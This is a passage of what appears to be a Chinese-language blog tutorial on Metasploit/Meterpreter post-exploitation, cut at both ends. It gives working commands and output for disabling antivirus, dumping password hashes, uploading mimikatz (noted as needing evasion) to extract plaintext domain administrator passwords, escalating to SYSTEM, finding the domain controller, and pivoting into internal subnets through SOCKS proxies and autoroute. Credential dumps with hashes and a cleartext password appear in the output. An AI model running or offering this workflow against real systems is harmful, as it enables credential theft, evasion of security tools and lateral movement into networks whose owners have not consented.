class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB947540)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB947540)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB947789)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB947789)       <span class="number">1</span></span><br><span class="line"> Microsoft Office <span class="number">2003</span> Web Components                                                  <span class="number">12.0</span><span class="number">.6213</span><span class="number">.1000</span></span><br><span class="line"> Microsoft Office <span class="number">2003</span> Web Components                                                  <span class="number">12.0</span><span class="number">.6213</span><span class="number">.1000</span></span><br></pre></td></tr></table></figure><h5 id="关闭杀毒软件"><a href="#关闭杀毒软件" class="headerlink" title="关闭杀毒软件"></a>关闭杀毒软件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;killav</span><br></pre></td></tr></table></figure><h5 id="判断是否是虚拟机"><a href="#判断是否是虚拟机" class="headerlink" title="判断是否是虚拟机"></a>判断是否是虚拟机</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm <span class="comment">#是否虚拟机</span></span><br><span class="line">run post/linux/gather/checkvm <span class="comment">#是否虚拟机</span></span><br><span class="line">meterpreter &gt; run post/windows/gather/checkvm</span><br></pre></td></tr></table></figure><h5 id="补丁信息情况与漏洞信息收集"><a href="#补丁信息情况与漏洞信息收集" class="headerlink" title="补丁信息情况与漏洞信息收集"></a>补丁信息情况与漏洞信息收集</h5><p>在拿到一个反弹shell后，可以用metaspolit的内置模块Local Exploit  SuggesterLocal-exploit-suggester，当我们用它来探测某一个系统时，他会告诉我们该系统有哪些exploit可能可以利用。但是由于该工具先是假设一个系统存在所有的相关漏洞，然后根据补丁信息再去排除，所以就导致误报率会高。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester</span><br></pre></td></tr></table></figure><h5 id="查看补丁信息"><a href="#查看补丁信息" class="headerlink" title="查看补丁信息"></a>查看补丁信息</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_patches  <span class="comment">#补丁信息</span></span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[*] Patch list saved to /Users/apple/.msf4/loot/<span class="number">20200906182724</span>_default_172<span class="number">.20</span><span class="number">.10</span><span class="number">.6</span>_enum_patches_447671.txt</span><br><span class="line">[*] KB2534111 applied</span><br><span class="line">[*] KB2999226 applied</span><br><span class="line">[*] KB976902 applied</span><br></pre></td></tr></table></figure><h5 id="Hash与明文密码获取"><a href="#Hash与明文密码获取" class="headerlink" title="Hash与明文密码获取"></a>Hash与明文密码获取</h5><p>获取目标机系统用户Hash</p><p>#需要SYSTEM权限</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/smart_hashdump</span><br><span class="line">[*] Running module against STU1</span><br><span class="line">[*] Hashes will be saved to the database <span class="keyword">if</span> one <span class="keyword">is</span> connected.</span><br><span class="line">[+] Hashes will be saved <span class="keyword">in</span> loot <span class="keyword">in</span> JtR password file format to:</span><br><span class="line">[*] /Users/apple/.msf4/loot/<span class="number">20200903163754</span>_default_172<span class="number">.20</span><span class="number">.10</span><span class="number">.6</span>_windows.hashes_560643.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running <span class="keyword">as</span> SYSTEM extracting hashes <span class="keyword">from</span> registry</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY fd4639f4e27c79683ae9fee56b44393f...</span><br><span class="line">[*] Obtaining the user list <span class="keyword">and</span> keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line">[*] No users <span class="keyword">with</span> password hints on this system</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[+] Administrator:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+] liukaifeng01:<span class="number">1000</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+] whoami:<span class="number">1004</span>:aad3b435b51404eeaad3b435b51404ee:e5292ea58e7e150003e00454b6bc729a:::</span><br><span class="line">[+] steady:<span class="number">1012</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">218</span>a30a4dc767f75f1456e646a5d07cd:::</span><br><span class="line">[+] steady123:<span class="number">1013</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">218</span>a30a4dc767f75f1456e646a5d07cd:::</span><br></pre></td></tr></table></figure><p>如果当前用户没有足够的权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against WEB</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] &#x2F;Users&#x2F;apple&#x2F;.msf4&#x2F;loot&#x2F;20201012180509_default_172.20.10.13_windows.hashes_113739.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[-] On this version of Windows you need to be NT AUTHORITY\SYSTEM to dump the hashes</span><br><span class="line">[-] Try setting GETSYSTEM to true.</span><br></pre></td></tr></table></figure><p>获得了本地账户的hask，获取明文密码，我们需要先载入mimikatz模块(需要免杀处理)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload mimikatz.exe 目标位置</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload &#x2F;tmp&#x2F;mimikatz.exe D:\S_JCIN\WebSite\OutWeb\L_CT\News</span><br><span class="line">[*] uploading  : &#x2F;tmp&#x2F;mimikatz.exe -&gt; D:S_JCINWebSiteOutWebL_CTNews</span><br><span class="line">[*] Uploaded 1020.76 KiB of 1020.76 KiB (100.0%): &#x2F;tmp&#x2F;mimikatz.exe -&gt; D:S_JCINWebSiteOutWebL_CTNews</span><br><span class="line">[*] uploaded   : &#x2F;tmp&#x2F;mimikatz.exe -&gt; D:S_JCINWebSiteOutWebL_CTNews</span><br></pre></td></tr></table></figure><p>mimikatz的使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">c:\\mimikatz.exe</span><br><span class="line"></span><br><span class="line">c:\&gt;mimikatz.exe</span><br><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Aug 16 2020 10:26:39</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/</span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line">mimikatz <span class="comment"># sekurlsa::logonPasswords</span></span><br><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">2499588</span> (<span class="number">00000000</span>:<span class="number">00262404</span>)</span><br><span class="line">Session           : Interactive <span class="keyword">from</span> <span class="number">1</span></span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : GOD</span><br><span class="line">Logon Server      : OWA</span><br><span class="line">Logon Time        : <span class="number">2020</span>/<span class="number">9</span>/<span class="number">3</span> <span class="number">13</span>:<span class="number">38</span>:<span class="number">09</span></span><br><span class="line">SID               : S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-2952760202</span><span class="number">-1353902439</span><span class="number">-2381784089</span><span class="number">-500</span></span><br><span class="line">msv :</span><br><span class="line"> [<span class="number">00000003</span>] Primary</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : GOD</span><br><span class="line"> * LM       : <span class="number">3333</span>deaae325ebb705026d3fb1a43796</span><br><span class="line"> * NTLM     : <span class="number">7</span>d0e302e0cbd94d9353ac4a51d7c39c1</span><br><span class="line"> * SHA1     : d4f206f0d8303230185b2ff2fedb7d40a62effa5</span><br><span class="line">tspkg :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : GOD</span><br><span class="line"> * Password : <span class="number">1999118</span>gxaGXA.</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : GOD</span><br><span class="line"> * Password : <span class="number">1999118</span>gxaGXA.</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : GOD.ORG</span><br><span class="line"> * Password : <span class="number">1999118</span>gxaGXA.</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br></pre></td></tr></table></figure><p>msf自身使用mimikaz</p><p>使用 mimikatz 模块需要System权限，所以我们在使用该模块之前需要将当前MSF中的shell提升为system。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">加载kiwi模块</span><br><span class="line">load mimikatz</span><br><span class="line">查看kiwi模块的使用</span><br><span class="line">help mimikatz</span><br></pre></td></tr></table></figure><p>使用以下命令查看系统中的明文密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br></pre></td></tr></table></figure><p>kiwi模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。所以如果目标系统是64位的，则必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载kiwi并且查看系统明文。如果目标系统是32位的，则没有这个限制。</p><p>hashdump</p><p>meterpreter权限不够，将其进程迁移到含有system的进程中（即使你getuid是system，但进程不在system也无法获得，亲测。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">[-] 2007: Operation failed: The parameter is incorrect.</span><br></pre></td></tr></table></figure><h5 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem</span><br></pre></td></tr></table></figure><p>如果getsystem获取不到权限，基本是被UAC限制了。</p><h4 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h4><h5 id="查找域控制器"><a href="#查找域控制器" class="headerlink" title="查找域控制器"></a>查找域控制器</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_domain  <span class="comment">#查找域控</span></span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_domain</span><br><span class="line"></span><br><span class="line">[+] FOUND Domain: god</span><br><span class="line">[+] FOUND Domain Controller: owa (IP: <span class="number">192.168</span><span class="number">.52</span><span class="number">.138</span>)</span><br></pre></td></tr></table></figure><h5 id="ifconfig查看DNS服务器地址"><a href="#ifconfig查看DNS服务器地址" class="headerlink" title="ifconfig查看DNS服务器地址"></a>ifconfig查看DNS服务器地址</h5><h4 id="代理与端口设置"><a href="#代理与端口设置" class="headerlink" title="代理与端口设置"></a>代理与端口设置</h4><h5 id="设置sockets5代理"><a href="#设置sockets5代理" class="headerlink" title="设置sockets5代理"></a>设置sockets5代理</h5><p>搜索一下可用代理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search socks</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                     Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -  ----                                     ---------------  ----    -----  -----------</span><br><span class="line">   <span class="number">0</span>  auxiliary/scanner/http/sockso_traversal  <span class="number">2012</span><span class="number">-03</span><span class="number">-14</span>       normal  No     Sockso Music Host Server <span class="number">1.5</span> Directory Traversal</span><br><span class="line">   <span class="number">1</span>  auxiliary/server/socks4a                                  normal  No     Socks4a Proxy Server</span><br><span class="line">   <span class="number">2</span>  auxiliary/server/socks5                                   normal  No     Socks5 Proxy Server</span><br><span class="line">   <span class="number">3</span>  auxiliary/server/socks_unc                                normal  No     SOCKS Proxy UNC Path Redirection</span><br></pre></td></tr></table></figure><p>设置代理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/server/socks5</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/server/socks5):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   PASSWORD                   no        Proxy password <span class="keyword">for</span> SOCKS5 listener</span><br><span class="line">   SRVHOST   <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>          yes       The address to listen on</span><br><span class="line">   SRVPORT   <span class="number">1080</span>             yes       The port to listen on</span><br><span class="line">   USERNAME                   no        Proxy username <span class="keyword">for</span> SOCKS5 listener</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name   Description</span><br><span class="line">   ----   -----------</span><br><span class="line">   Proxy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 auxiliary(server/socks5) &gt; set SRVHOST <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">SRVHOST =&gt; 127.0.0.1</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; set SRVPORT <span class="number">5555</span></span><br><span class="line">SRVPORT =&gt; 5555</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; run</span><br><span class="line">[*] Auxiliary module running <span class="keyword">as</span> background job <span class="number">0.</span></span><br><span class="line">msf5 auxiliary(server/socks5) &gt;</span><br><span class="line">[*] Starting the socks5 proxy server</span><br></pre></td></tr></table></figure><p>然后也可以直接使用一下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set proxies socks5:127.0.0.1:8990  设置代理</span><br><span class="line">setg ReverseAllowProxy true 允许反向代理</span><br></pre></td></tr></table></figure><p>获取内网网段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">Local subnet: <span class="number">169.254</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">Local subnet: <span class="number">172.20</span><span class="number">.10</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.240</span></span><br><span class="line">Local subnet: <span class="number">192.168</span><span class="number">.52</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><p>添加路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 198.168.52.0&#x2F;24</span><br></pre></td></tr></table></figure><p>查看是否添加成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   <span class="number">198.168</span><span class="number">.52</span><span class="number">.0</span>       <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>      Session <span class="number">1</span></span><br></pre></td></tr></table></figure><p>ARP扫描内网主机</p><h5 id="添加去往”内网网段”的路由"><a href="#添加去往”内网网段”的路由" class="headerlink" title="添加去往”内网网段”的路由"></a>添加去往”内网网段”的路由</h5><ul><li><p>MSF 路由添加帮助查询命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -h</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">[*] Usage:   run autoroute [-r] -s subnet -n netmask</span><br><span class="line">[*] Examples:</span><br><span class="line">[*]   run autoroute -s <span class="number">10.1</span><span class="number">.1</span><span class="number">.0</span> -n <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>  <span class="comment"># Add a route to 10.10.10.1/255.255.255.0</span></span><br><span class="line">[*]   run autoroute -s <span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span>                 <span class="comment"># Netmask defaults to 255.255.255.0</span></span><br><span class="line">[*]   run autoroute -s <span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span>/<span class="number">24</span>              <span class="comment"># CIDR notation is also okay</span></span><br><span class="line">[*]   run autoroute -p                            <span class="comment"># Print active routing table</span></span><br><span class="line">[*]   run autoroute -d -s <span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span>              <span class="comment"># Deletes the 10.10.10.1/255.255.255.0 route</span></span><br><span class="line">[*] Use the <span class="string">&quot;route&quot;</span> <span class="keyword">and</span> <span class="string">&quot;ipconfig&quot;</span> Meterpreter commands to learn about available routes</span><br><span class="line">[-] Deprecation warning: This script has been replaced by the post/multi/manage/autoroute module</span><br></pre></td></tr></table></figure></li><li><p>获取目标内网地址段 </p><p>具体获取被攻击目标内网地址网段的命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">Local subnet: <span class="number">172.17</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><p>由上可以获知，目标内网网段是“172.17.0.0./24”</p></li><li><p>添加去往目标网段的转发路由 </p><p>在meterpreter 会话上直接添加去往目标网段的路由，具体添加方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s <span class="number">172.17</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">[*] Adding a route to <span class="number">172.17</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>...</span><br><span class="line">[+] Added route to <span class="number">172.17</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span> via <span class="number">10.48</span><span class="number">.8</span><span class="number">.234</span></span><br><span class="line">[*] Use the -p option to list all active routes</span><br></pre></td></tr></table></figure></li><li><p>添加网路由后，我们来查看下路由的添加情况如何</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   <span class="number">172.17</span><span class="number">.0</span><span class="number">.0</span>         <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>      Session <span class="number">3</span></span><br></pre></td></tr></table></figure></li></ul><p>将去往内网的路由打通后，接下来就可以使用MSF平台直接对内网主机扫描和进行各种高危漏洞的直接渗透利用了。</p><ul><li><p>删除路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -d -s 172.20.10.0</span><br></pre></td></tr></table></figure></li></ul><h4 id="autoroute模块"><a href="#autoroute模块" class="headerlink" title="autoroute模块"></a>autoroute模块</h4><h5 id="获取当前机器的所有网段信息"><a href="#获取当前机器的所有网段信息" class="headerlink" title="获取当前机器的所有网段信息"></a>获取当前机器的所有网段信息</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">Local subnet: <span class="number">10.10</span><span class="number">.10</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Local subnet: <span class="number">172.20</span><span class="number">.10</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.240</span></span><br></pre></td></tr></table></figure><h5 id="添加目标内网网段的路由"><a href="#添加目标内网网段的路由" class="headerlink" title="添加目标内网网段的路由"></a>添加目标内网网段的路由</h5><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s <span class="number">10.10</span>.<span class="number">10.0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are <span class="keyword">deprecated</span>. <span class="keyword">Try</span> post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">[*] Adding a route <span class="keyword">to</span> <span class="number">10.10</span>.<span class="number">10.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span>...</span><br><span class="line">[+] Added route <span class="keyword">to</span> <span class="number">10.10</span>.<span class="number">10.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span> via <span class="number">172.20</span>.<span class="number">10.13</span></span><br><span class="line">[*] Use the -p option <span class="keyword">to</span> list all active routes</span><br></pre></td></tr></table></figure><h5 id="打印当前添加的路由表信息"><a href="#打印当前添加的路由表信息" class="headerlink" title="打印当前添加的路由表信息"></a>打印当前添加的路由表信息</h5><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are <span class="keyword">deprecated</span>. <span class="keyword">Try</span> post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   <span class="number">10.10</span>.<span class="number">10.0</span>         <span class="number">255.255</span>.<span class="number">255.0</span>      Session <span class="number">4</span></span><br></pre></td></tr></table></figure><p>删除指定的路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -d -s 10.10.10.0&#x2F;24</span><br></pre></td></tr></table></figure><h4 id="内网主机发现"><a href="#内网主机发现" class="headerlink" 